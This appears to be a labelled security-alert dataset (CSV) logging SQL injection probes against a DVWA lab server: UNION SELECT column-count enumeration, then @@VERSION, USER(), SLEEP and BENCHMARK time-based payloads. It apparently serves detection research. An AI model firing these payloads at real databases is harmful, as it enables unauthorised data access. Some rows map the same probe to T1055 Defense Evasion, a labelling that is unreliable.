timestamp,rule_id,rule_level,data_id,MITRE_ID,MITRE_Tactic,srcip,dstip,full_log,data_protocol,data_url,label
2025-03-31T21:45:26.650+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:45:28 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201--%20,2
2025-03-31T21:45:33.155+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:45:33 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2--%20",2
2025-03-31T21:45:37.494+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:45:38 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3--%20",2
2025-03-31T21:45:43.999+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:45:43 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4--%20",2
2025-03-31T21:45:48.339+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:45:48 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5--%20",2
2025-03-31T21:45:54.757+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:45:53 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6--%20",2
2025-03-31T21:45:58.766+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:45:58 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7--%20",2
2025-03-31T21:46:04.772+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:03 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8--%20",2
2025-03-31T21:46:08.777+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:08 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9--%20",2
2025-03-31T21:46:14.785+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:13 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10--%20",2
2025-03-31T21:46:18.790+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:18 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11--%20",2
2025-03-31T21:46:24.797+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:23 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12--%20",2
2025-03-31T21:46:28.800+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:28 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13--%20",2
2025-03-31T21:46:34.808+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:33 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14--%20",2
2025-03-31T21:46:38.821+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:38 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20",2
2025-03-31T21:46:44.827+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:43 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20",2
2025-03-31T21:46:48.834+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:48 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--%20",2
2025-03-31T21:46:54.843+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:53 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--%20",2
2025-03-31T21:46:58.848+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:46:58 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20",2
2025-03-31T21:47:04.856+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:03 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--%20",2
2025-03-31T21:47:08.861+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:08 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--%20",2
2025-03-31T21:47:14.867+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:13 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--%20",2
2025-03-31T21:47:18.882+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:18 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--%20",2
2025-03-31T21:47:24.884+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:23 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--%20",2
2025-03-31T21:47:30.888+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:28 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--%20",2
2025-03-31T21:47:34.901+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:33 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--%20",2
2025-03-31T21:47:40.903+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:38 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%20",2
2025-03-31T21:47:44.913+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:44 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--%20",2
2025-03-31T21:47:50.923+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:49 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--%20",2
2025-03-31T21:47:54.929+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:54 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--%20 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--%20",2
2025-03-31T21:48:00.935+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:47:59 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),3 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),3",2
2025-03-31T21:48:04.939+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:04 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),4 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),4",2
2025-03-31T21:48:10.946+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:09 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",2
2025-03-31T21:48:14.953+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:14 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",2
2025-03-31T21:48:20.964+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:19 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",2
2025-03-31T21:48:24.962+0700,31152,10,302,T1055,Defense Evasion,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:24 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",2
2025-03-31T21:48:30.970+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:29 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",2
2025-03-31T21:48:34.984+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:34 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",2
2025-03-31T21:48:40.982+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:39 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",2
2025-03-31T21:48:44.993+0700,31103,7,302,T1190,Initial Access,192.168.88.1,192.168.88.134,"192.168.88.1 - - [31/Mar/2025:07:48:44 -0700] ""GET /DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12 HTTP/1.1"" 302 672 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0""",GET,"/DVWA/vulnerabilities/sqli/?id=%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",2
